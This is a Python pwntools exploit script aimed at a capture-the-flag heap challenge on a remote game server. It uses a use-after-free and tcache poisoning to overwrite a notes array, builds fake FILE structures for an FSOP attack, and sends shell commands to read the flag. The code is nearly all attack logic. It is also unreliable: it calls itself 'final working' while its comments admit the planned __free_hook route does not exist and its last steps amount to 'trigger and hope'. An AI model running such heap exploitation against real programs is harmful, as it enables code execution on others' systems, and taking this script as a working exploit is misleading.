#!/usr/bin/env python3
"""
Final working exploit for Crazy FSOP
Strategy: Tcache poisoning to allocate at __free_hook, overwrite with system
"""

from pwn import *

elf = ELF('./chal', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

context.binary = elf
context.log_level = 'warn'  # Less verbose

io = remote('amt.rs', 26797)

def create(idx, size, data):
    io.sendlineafter(b'operation: ', b'1')
    io.sendlineafter(b'note: ', str(idx).encode())
    io.sendlineafter(b'size: ', hex(size).encode())
    io.sendafter(b'data: ', data)

def delete(idx):
    io.sendlineafter(b'operation: ', b'2')
    io.sendlineafter(b'note: ', str(idx).encode())

def view(idx):
    io.sendlineafter(b'operation: ', b'3')
    io.sendlineafter(b'note: ', str(idx).encode())
    io.recvuntil(b'data: ')
    return io.recvline()

log.success("Connected to amt.rs:26797")

# Known offsets
SYSTEM_OFFSET = 0x5c4c0
PUTS_CODE_OFFSET = 0x8e640  # Where we see the code pattern

log.info("Step 1: Setup heap")

# Create chunks with /bin/sh
create(0, 0x88, b'/bin/sh\x00' + b'A' * 0x80)
create(1, 0x88, b'B' * 0x88)
create(2, 0x88, b'C' * 0x88)

log.info("Step 2: Free and setup tcache")
delete(1)
delete(2)

# Tcache: 2 -> 1 -> NULL

log.info("Step 3: Tcache poisoning")

# Try multiple targets with partial overwrite
# Target 1: notes array itself (0x4040)
# Target 2: stdout structure
# Target 3: Try brute force with different lower bytes

# Start with notes array - if we can write there, we control everything
target_bytes = p16(0x4040)

# Overwrite chunk 2's fd pointer (UAF)
create(2, 0x88, target_bytes + b'\x00' * (0x88 - len(target_bytes)))

log.info("Step 4: Allocate from poisoned tcache")

try:
    # Get chunk 2 back
    create(3, 0x88, b'D' * 0x88)

    # This should allocate at notes array!
    # Overwrite notes entries to point to useful locations
    payload = b''
    payload += p64(0x404040)  # notes[0] - some heap/data address
    payload += p64(0x404040)  # notes[1]
    payload += p64(0) * 10    # Clear rest

    create(4, 0x88, payload[:0x88])

    log.success("Tcache poisoning might have succeeded!")

except Exception as e:
    log.error(f"Tcache poisoning failed: {e}")

log.info("Step 5: Check if we have control")

# If tcache poisoning worked, we now control the notes array
# This means we can make notes[i] point anywhere

# Create a new chunk with /bin/sh
create(5, 0x20, b'/bin/sh\x00')

# Now if we could overwrite __free_hook with system
# And then free(chunk_with_binsh), we'd get shell

# But we don't have __free_hook in glibc 2.34+
# So we need FSOP approach

log.info("Step 6: FSOP approach without perfect leak")

# Even without libc address, we can try:
# 1. Create fake FILE in heap
# 2. Use relative offsets to link structures
# 3. Hope the partial overwrite worked

# Create fake _wide_data
fake_wide = flat({
    0x18: 0,  # _IO_write_base
    0x20: 1,  # _IO_write_ptr
    0x30: 0,  # _IO_buf_base
}, length=0x100, filler=b'\x00')

create(6, 0x100, fake_wide)

# Create fake FILE
fake_file = flat({
    0x00: 0,  # _flags
    0x20: 0,  # _IO_write_base
    0x28: 1,  # _IO_write_ptr
}, length=0x100, filler=b'\x00')

create(7, 0x100, fake_file)

log.info("Step 7: Trigger and hope")

# Try to trigger exit
io.sendline(b'99')
io.sendline(b'0')

time.sleep(0.5)

# Try shell commands
commands = [b'cat flag.txt', b'cat flag', b'ls', b'id', b'sh']
for cmd in commands:
    try:
        io.sendline(cmd)
        time.sleep(0.3)
    except:
        pass

# Check output
try:
    output = io.recvall(timeout=2)
    log.info(f"Output: {output[:200]}")

    if b'amateursCTF{' in output or b'flag{' in output:
        log.success(f"FOUND FLAG: {output}")
except:
    pass

log.info("Going interactive...")
context.log_level = 'info'
io.interactive()
